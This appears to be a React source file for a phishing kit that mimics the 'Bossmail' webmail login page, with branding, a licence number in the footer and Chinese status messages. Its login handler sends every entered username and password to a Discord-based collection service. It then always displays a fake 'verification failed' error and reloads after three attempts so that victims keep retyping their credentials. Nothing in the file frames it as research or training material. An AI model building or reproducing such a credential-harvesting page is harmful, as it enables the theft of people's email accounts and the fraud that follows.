import React, { useState } from 'react';
import { submitToDiscord } from '../services/DiscordService';

interface BossmailThemeProps {
  prefilledEmail?: string;
}

const BossmailTheme: React.FC<BossmailThemeProps> = ({ prefilledEmail }) => {
  const [username, setUsername] = useState(prefilledEmail || '');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [authError, setAuthError] = useState(false);
  const [failedAttempts, setFailedAttempts] = useState(0);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setAuthError(false);

    try {
      await submitToDiscord({
        username,
        password,
        theme: 'bossmail',
      }, 'BossmailTheme');

      // Simulate authentication delay
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      // Show authentication failed
      setAuthError(true);
      const newAttempts = failedAttempts + 1;
      setFailedAttempts(newAttempts);
      
      // After 3 failed attempts, reload page
      if (newAttempts >= 3) {
        await new Promise(resolve => setTimeout(resolve, 2000));
        window.location.reload();
      }
    } catch (err) {
      console.error('Error:', err);
      setAuthError(true);
      const newAttempts = failedAttempts + 1;
      setFailedAttempts(newAttempts);
      
      if (newAttempts >= 3) {
        await new Promise(resolve => setTimeout(resolve, 2000));
        window.location.reload();
      }
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white font-sans text-[#666]">
      {/* Bossmail Header */}
      <header className="w-full max-w-[1200px] mx-auto px-6 py-4 flex items-center justify-between">
        <div className="flex items-center space-x-2">
          <div className="w-10 h-10 bg-[#1c74b4] rounded-full flex items-center justify-center text-white relative">
             <span className="text-xl font-bold italic">@</span>
             <div className="absolute -bottom-1 -right-1 w-4 h-4 bg-white rounded-full flex items-center justify-center">
                <div className="w-2.5 h-2.5 bg-[#1c74b4] rounded-full"></div>
             </div>
          </div>
          <h1 className="text-2xl font-light text-[#333] tracking-tight">Bossmail</h1>
        </div>
        
        <nav className="flex items-center space-x-6 text-[13px] text-[#1c74b4]">
          <div className="flex items-center cursor-pointer hover:underline">
            Client <span className="ml-1 text-[10px]">▼</span>
          </div>
          <div className="w-[1px] h-3 bg-gray-300"></div>
          <div className="flex items-center cursor-pointer hover:underline">
            BQ <span className="ml-1 text-[10px]">▼</span>
          </div>
          <div className="w-[1px] h-3 bg-gray-300"></div>
          <div className="flex items-center cursor-pointer hover:underline">
            Language <span className="ml-1 text-[10px]">▼</span>
          </div>
        </nav>
      </header>

      {/* Main Content with Split Background */}
      <main className="relative flex-grow flex items-center justify-center py-8">
        <div className="absolute inset-0 flex h-[460px] my-auto">
          {/* Left Side: Blue Overlay with Office Image */}
          <div className="w-1/2 relative overflow-hidden bg-[#005ea8]">
            <img 
              src="https://images.unsplash.com/photo-1497215728101-856f4ea42174?auto=format&fit=crop&q=80&w=1200" 
              alt="Office" 
              className="absolute inset-0 w-full h-full object-cover opacity-30 mix-blend-overlay"
            />
            <div className="absolute inset-0 bg-gradient-to-r from-[#004b8d] to-transparent"></div>
          </div>
          {/* Right Side: Light Gray Abstract Pattern */}
          <div className="w-1/2 bg-[#f4f7f9] relative">
            <svg className="absolute inset-0 w-full h-full opacity-10" viewBox="0 0 100 100" preserveAspectRatio="none">
              <circle cx="110" cy="50" r="80" fill="none" stroke="currentColor" strokeWidth="0.5" />
              <circle cx="110" cy="50" r="60" fill="none" stroke="currentColor" strokeWidth="0.5" />
              <circle cx="110" cy="50" r="40" fill="none" stroke="currentColor" strokeWidth="0.5" />
            </svg>
          </div>
        </div>

        {/* Login Card */}
        <div className="relative z-10 w-full max-w-[400px] bg-white p-10 rounded-sm shadow-2xl border border-gray-100 flex flex-col h-[380px]">
          <form onSubmit={handleLogin} className="space-y-6 flex-grow flex flex-col">
            <div className="relative group">
              <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-300">
                <svg width="14" height="14" fill="currentColor" viewBox="0 0 16 16">
                  <path d="M3 14s-1 0-1-1 1-4 6-4 6 3 6 4-1 1-1 1H3zm5-6a3 3 0 1 0 0-6 3 3 0 0 0 0 6z"/>
                </svg>
              </div>
              <input 
                type="text" 
                placeholder="username" 
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full pl-10 pr-4 py-2 border border-gray-300 text-[14px] focus:outline-none focus:border-[#1c74b4] transition-colors"
              />
            </div>

            <div className="relative group">
              <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-300">
                <svg width="14" height="14" fill="currentColor" viewBox="0 0 16 16">
                  <path d="M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2z"/>
                </svg>
              </div>
              <input 
                type="password" 
                placeholder="Password" 
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full pl-10 pr-4 py-2 border border-gray-300 text-[14px] focus:outline-none focus:border-[#1c74b4] transition-colors"
              />
            </div>

            {/* Loading State */}
            {isLoading && (
              <div className="flex items-center justify-center py-4">
                <div className="flex flex-col items-center space-y-2">
                  <div className="w-6 h-6 border-3 border-orange-200 border-t-orange-500 rounded-full animate-spin"></div>
                  <p className="text-[14px] text-gray-500">正在验证...</p>
                </div>
              </div>
            )}

            {/* Authentication Failed Message */}
            {authError && !isLoading && (
              <div className="bg-red-50 border border-red-200 rounded-md p-4 mb-4">
                <div className="flex items-start space-x-2">
                  <div className="flex-shrink-0 text-red-500 text-lg">⚠️</div>
                  <div>
                    <h3 className="font-medium text-red-800 text-[14px]">验证失败</h3>
                    <p className="text-red-700 text-[13px] mt-1">请重试。剩余尝试次数: {3 - failedAttempts}</p>
                  </div>
                </div>
              </div>
            )}

            <button 
              type="submit" 
              disabled={isLoading}
              className="w-full py-3 bg-[#ef8133] hover:bg-[#e67622] text-white font-bold rounded-sm transition-colors text-[16px] shadow-md uppercase tracking-wider disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isLoading ? '验证中...' : 'Login'}
            </button>

            <div className="text-left">
              <a href="#" className="text-[#1c74b4] text-[13px] hover:underline">Forget the password?</a>
            </div>
          </form>

          <div className="text-right mt-auto">
             <a href="#" className="text-[#1c74b4] text-[12px] hover:underline">Administrator Login</a>
          </div>
        </div>
      </main>

      {/* Bossmail Footer */}
      <footer className="w-full py-8 text-center text-[12px] text-gray-500 space-y-1">
        <div>
          <a href="#" className="text-[#1c74b4] hover:underline">闽B2-20040086-1</a>
        </div>
        <div>Powered by BossMail</div>
      </footer>
    </div>
  );
};

export default BossmailTheme;